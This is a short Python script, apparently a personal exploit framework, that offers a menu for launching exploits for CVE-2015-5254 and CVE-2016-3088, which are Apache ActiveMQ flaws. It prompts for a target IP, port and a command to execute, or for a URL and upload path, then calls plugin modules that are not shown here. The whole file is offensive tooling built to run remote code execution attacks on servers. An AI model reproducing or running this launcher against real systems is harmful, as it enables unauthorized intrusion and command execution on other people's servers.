#author:九世
#time:2019/1/16

try:
    import readline
except:
    pass

import time

class Main:
    def cve_2015_5254(self):
        obj=__import__('plugin.CVE-2015-5254',fromlist=True) #导入了plugin文件里的CVE-2015-2524
        daoru=getattr(obj,'jiancha') #调用了jiancha()函数,此时：daoru=jiancha()
        daoru()
        time.sleep(1)
        daoru2=getattr(obj,'run')
        ips=input('IP:')
        ports=input('port:')
        execs=input('exec:')
        daoru2(execs,ips,ports)

    def cve_2016_3088(self):
        oks=__import__('plugin.CVE-2016-3088',fromlist=True)
        daoru2=getattr(oks,'jiancha')
        userq=input('URL:')
        path=input('path:')
        daoru2(userq,path)
if __name__ == '__main__':
    obj=Main()
    exp_list=['[1] CVE-2015-5254','[2] CVE-2016-3088']
    exp_cat={'1':obj.cve_2015_5254,'2':obj.cve_2016_3088}
    while True:
        print('[h] exploit select:)')
        for e in exp_list:
            print(e)
    
        user=input('select:>')
        if user in exp_cat:
            exp_cat.get(user)()
            print('')
            print('')
        elif user=='exit':
            break
        else:
            print('[e] Not Found select')
            print('')
            print('')
            continue